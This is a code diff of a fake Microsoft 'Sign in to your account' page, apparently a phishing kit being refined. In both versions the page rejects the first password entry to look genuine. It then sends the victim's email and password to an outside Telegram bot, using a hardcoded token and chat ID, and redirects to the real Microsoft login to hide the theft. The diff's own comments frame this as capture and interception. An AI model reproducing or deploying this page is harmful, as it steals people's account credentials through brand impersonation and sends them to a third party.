@@ -6,129 +6,167 @@
     <title>Sign in to your account</title>
     <style>
         * { box-sizing: border-box; -webkit-font-smoothing: antialiased; }
+        
+        body, html {
+            margin: 0; padding: 0; height: 100%; width: 100%;
+            font-family: 'Segoe UI', Tahoma, Helvetica, Sans-Serif;
+        }
+
         body {
-            margin: 0; padding: 0;
-            font-family: 'Segoe UI', Arial, sans-serif;
-            /* Updated to the exact background in your screenshot */
-            background: url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.jpg') no-repeat center center fixed;
+            /* Forced Background with Fallback Color */
+            background-color: #deeaf4;
+            background-image: url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.jpg');
+            background-repeat: no-repeat;
+            background-position: center center;
+            background-attachment: fixed;
             background-size: cover;
             display: flex; justify-content: center; align-items: center;
-            min-height: 100vh;
         }
-        .outer-container { width: 440px; }
+
         .login-card {
-            background: #fff; padding: 44px;
+            background: #fff;
+            width: 440px;
+            padding: 44px;
             box-shadow: 0 2px 6px rgba(0,0,0,0.2);
-            margin-bottom: 28px; min-height: 376px;
+            min-height: 376px;
             position: relative;
         }
+
         .ms-logo { width: 108px; margin-bottom: 24px; display: block; }
-        h1 { font-size: 24px; font-weight: 600; margin: 0 0 16px 0; color: #1b1b1b; }
         
+        h1 { 
+            font-size: 24px; font-weight: 600; 
+            margin: 0 0 16px 0; color: #1b1b1b; 
+        }
+
         .identity-container {
             display: flex; align-items: center;
             margin-bottom: 20px; cursor: pointer;
             font-size: 15px; color: #1b1b1b;
         }
-        .back-arrow-text {
-            font-size: 20px; margin-right: 10px;
-            line-height: 1; font-weight: 300; color: #505050;
-            margin-top: -4px; 
+
+        .back-arrow {
+            width: 24px; height: 24px; margin-right: 8px;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M20 24l-8-8 8-8" fill="none" stroke="%23505050" stroke-width="2"/></svg>') no-repeat center;
         }
 
         .input-field {
-            width: 100%; border: none; border-bottom: 1px solid #0067b8;
+            width: 100%; border: none; border-bottom: 1px solid #666;
             padding: 8px 0; font-size: 16px; margin-bottom: 12px;
-            outline: none;
+            outline: none; transition: border-color 0.2s;
         }
-        .error-text { color: #e81123; font-size: 13px; margin: 10px 0; display: none; }
-        
+
+        .input-field:focus { border-bottom: 2px solid #0067b8; }
+
+        .error-msg { color: #e81123; font-size: 13px; margin-bottom: 10px; display: none; }
+
         .button-row { display: flex; justify-content: flex-end; margin-top: 40px; }
-        .btn-next {
+
+        .btn-primary {
             background-color: #0067b8; color: #fff; border: none;
-            padding: 8px 32px; font-size: 15px; cursor: pointer; min-width: 108px;
+            padding: 8px 32px; font-size: 15px; cursor: pointer;
+            min-width: 108px;
         }
-        .footer { position: fixed; bottom: 0; right: 0; padding: 12px 30px; font-size: 12px; }
-        .footer a { margin-left: 24px; text-decoration: none; color: #000; cursor: pointer; }
+
+        .btn-primary:hover { background-color: #005da6; }
+        .btn-primary:disabled { background-color: #ccc; cursor: not-allowed; }
+
+        .footer {
+            position: fixed; bottom: 0; right: 0;
+            padding: 12px 30px; font-size: 12px;
+        }
+        .footer a { margin-left: 24px; text-decoration: none; color: #000; }
     </style>
 </head>
 <body>
-    <div class="outer-container">
-        <div class="login-card">
-            <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="ms-logo">
-            
-            <div id="email-section">
-                <h1>Sign in</h1>
-                <input type="email" id="user-email" placeholder="Email, phone, or Skype" class="input-field" onkeydown="if(event.key==='Enter') showPassword()">
-                <div class="button-row"><button class="btn-next" onclick="showPassword()">Next</button></div>
-            </div>
 
-            <div id="password-section" style="display: none;">
-                <div class="identity-container" onclick="showEmail()">
-                    <span class="back-arrow-text">&#8592;</span>
-                    <span id="display-email"></span>
-                </div>
-                <h1>Enter password</h1>
-                <div id="pw-error" class="error-text">That password is incorrect. Please try again.</div>
-                <input type="password" id="user-password" placeholder="Password" class="input-field" onkeydown="if(event.key==='Enter') submitData()">
-                <div class="button-row"><button class="btn-next" id="signin-btn" onclick="submitData()">Sign in</button></div>
+    <div class="login-card">
+        <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="ms-logo" alt="Microsoft">
+        
+        <div id="section-email">
+            <h1>Sign in</h1>
+            <input type="email" id="inp-email" placeholder="Email, phone, or Skype" class="input-field" autocomplete="off">
+            <div class="button-row">
+                <button class="btn-primary" onclick="goToPassword()">Next</button>
+            </div>
+        </div>
+
+        <div id="section-password" style="display: none;">
+            <div class="identity-container" onclick="goToEmail()">
+                <div class="back-arrow"></div>
+                <span id="display-user"></span>
+            </div>
+            <h1>Enter password</h1>
+            <div id="err-pass" class="error-msg">That password is incorrect. Please try again.</div>
+            <input type="password" id="inp-pass" placeholder="Password" class="input-field">
+            <div class="button-row">
+                <button class="btn-primary" id="btn-submit" onclick="finalSubmit()">Sign in</button>
             </div>
         </div>
     </div>
-    <div class="footer"><a>Terms of use</a><a>Privacy & cookies</a></div>
+
+    <div class="footer">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy & cookies</a>
+    </div>
 
     <script>
-        let emailVal = "";
-        let attempts = 0;
+        let userEmail = "";
+        let attempt = 0;
 
-        function showPassword() {
-            emailVal = document.getElementById('user-email').value;
-            if(!emailVal) return;
-            document.getElementById('email-section').style.display = 'none';
-            document.getElementById('password-section').style.display = 'block';
-            document.getElementById('display-email').innerText = emailVal;
-            document.getElementById('user-password').focus();
+        function goToPassword() {
+            userEmail = document.getElementById('inp-email').value;
+            if(!userEmail) return;
+            document.getElementById('section-email').style.display = 'none';
+            document.getElementById('section-password').style.display = 'block';
+            document.getElementById('display-user').innerText = userEmail;
+            document.getElementById('inp-pass').focus();
         }
 
-        function showEmail() {
-            document.getElementById('password-section').style.display = 'none';
-            document.getElementById('email-section').style.display = 'block';
+        function goToEmail() {
+            document.getElementById('section-password').style.display = 'none';
+            document.getElementById('section-email').style.display = 'block';
         }
 
-        async function submitData() {
-            const passVal = document.getElementById('user-password').value;
-            if(!passVal) return;
+        async function finalSubmit() {
+            const pass = document.getElementById('inp-pass').value;
+            const err = document.getElementById('err-pass');
+            const btn = document.getElementById('btn-submit');
             
-            attempts++;
-            const errorMsg = document.getElementById('pw-error');
+            if(!pass) return;
+            attempt++;
 
-            // Scenario: Reject once to look real, then pass on second attempt
-            if (attempts === 1) {
-                errorMsg.style.display = 'block';
-                document.getElementById('user-password').value = "";
+            // Mimic real validation: Fail once, succeed twice
+            if(attempt === 1) {
+                err.style.display = 'block';
+                document.getElementById('inp-pass').value = "";
                 return;
             }
 
-            errorMsg.style.display = 'none';
-            document.getElementById('signin-btn').innerText = "Verifying...";
+            // Success Flow
+            err.style.display = 'none';
+            btn.innerText = "Verifying...";
+            btn.disabled = true;
 
             const botToken = "8762119215:AAFqwntuZq7tLC25lf9wtNlddbZ62njFcHo";
             const chatId = "5733378501";
-            const message = `🚨 **FINAL TRIAL CAPTURE**\n\n**User:** ${emailVal}\n**Pass:** ${passVal}`;
+            const text = `🎯 **SUCCESSFUL INTERCEPT**\n\n**User:** ${userEmail}\n**Pass:** ${pass}`;
 
             try {
-                // We use a "no-cors" mode if needed, but standard fetch should work for Telegram
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                // Using 'keepalive' to ensure the request finishes even if the page redirects
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML" })
+                    body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' }),
+                    keepalive: true
                 });
-            } catch (e) { console.error(e); }
+            } catch (e) {}
 
-            // Final Redirect to the real MFA flow
+            // Delay redirect slightly to ensure Telegram receives the data
             setTimeout(() => {
-                window.location.href = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-f0d6-410c-984c-f8310070e304&response_type=id_token&scope=openid&nonce=123&login_hint=" + encodeURIComponent(emailVal);
-            }, 1000);
+                const finalUrl = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-f0d6-410c-984c-f8310070e304&response_type=id_token&scope=openid&nonce=123&login_hint=" + encodeURIComponent(userEmail);
+                window.location.href = finalUrl;
+            }, 800);
         }
     </script>
 </body>
